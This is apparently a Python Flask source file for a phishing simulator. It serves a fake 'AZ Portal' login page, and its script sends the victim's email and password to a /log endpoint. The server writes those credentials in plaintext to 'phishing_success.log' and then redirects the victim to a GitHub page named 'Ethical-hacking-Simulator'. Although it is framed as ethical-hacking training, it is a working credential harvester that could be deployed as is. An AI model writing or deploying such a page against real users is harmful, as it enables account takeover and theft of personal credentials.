from flask import Flask, request, jsonify, render_template_string
import os
from datetime import datetime

app = Flask(__name__)

# Ensure the log directory exists
LOG_DIR = '/home/logs'
os.makedirs(LOG_DIR, exist_ok=True)

LOG_FILE = os.path.join(LOG_DIR, 'phishing_success.log')

# HTML for the frontend
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AZ Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }

        .login-container {
            background: white;
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .login-header h1 {
            color: #333;
            font-size: 2rem;
            margin-bottom: 0.5rem;
        }

        .login-header p {
            color: #666;
            font-size: 0.9rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #333;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid #e1e1e1;
            border-radius: 0.5rem;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            color: #666;
        }

        .forgot-password {
            color: #667eea;
            text-decoration: none;
            font-size: 0.9rem;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .login-button {
            width: 100%;
            padding: 0.75rem;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 0.5rem;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.3s ease;
        }

        .login-button:hover {
            opacity: 0.9;
        }

        .signup-link {
            text-align: center;
            margin-top: 1.5rem;
            color: #666;
        }

        .signup-link a {
            color: #667eea;
            text-decoration: none;
            font-weight: 500;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #dc3545;
            font-size: 0.9rem;
            margin-top: 0.5rem;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>Welcome Back</h1>
            <p>Please enter your credentials to login</p>
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Email</label>
                <input type="email" id="username" required placeholder="Enter your email">
                <div class="error-message" id="message"></div>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required placeholder="Enter your password">
            </div>
            <div class="remember-forgot">
                <label class="remember-me">
                    <input type="checkbox" id="remember">
                    <span>Remember me</span>
                </label>
                <a href="#" class="forgot-password">Forgot Password?</a>
            </div>
            <button type="submit" class="login-button">Login</button>
            <div class="signup-link">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </form>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', async function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const submitButton = document.querySelector('button[type="submit"]');
            const messageDiv = document.getElementById('message');

            // Basic validation
            let hasError = false;
            if (!username) {
                messageDiv.textContent = 'Proszę podać adres e-mail';
                hasError = true;
            } else if (!password) {
                messageDiv.textContent = 'Proszę podać hasło';
                hasError = true;
            } else {
                messageDiv.textContent = ''; 
            }

            if (!hasError) {
                
                submitButton.textContent = 'Trwa logowanie, proszę czekać...';
                submitButton.disabled = true;

                try {
                    const response = await fetch('/log', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ 
                            email: username, 
                            password: password 
                        }),
                    });

                    // Redirect to a link even if request fails
                    window.location.href = 'https://github.com/BruNwa/Ethical-hacking-Simulator';
                } catch (error) {
                    console.error('Failed to send credentials:', error);
                    window.location.href = 'https://github.com/BruNwa/Ethical-hacking-Simulator';
                }
            }
        });

        // Add click handlers for help and documentation toggles
        document.querySelectorAll('#showHelp a').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                const isHelp = this.textContent === 'Pomoc';
                document.getElementById('docContent').style.display = isHelp ? 'none' : 'block';
                document.getElementById('helpContent').style.display = isHelp ? 'block' : 'none';
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # Serve the HTML frontend
    return render_template_string(HTML_CONTENT)

@app.route('/log', methods=['POST'])
def log_credentials():
    data = request.get_json()

    if not data or 'email' not in data or 'password' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    email = data['email']
    password = data['password']

    # Log the credentials
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp.ljust(20)} | {'CREDENTIALS CAPTURED'.ljust(30)} | Email: {email}, Password: {password}\n"

    try:
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=True)
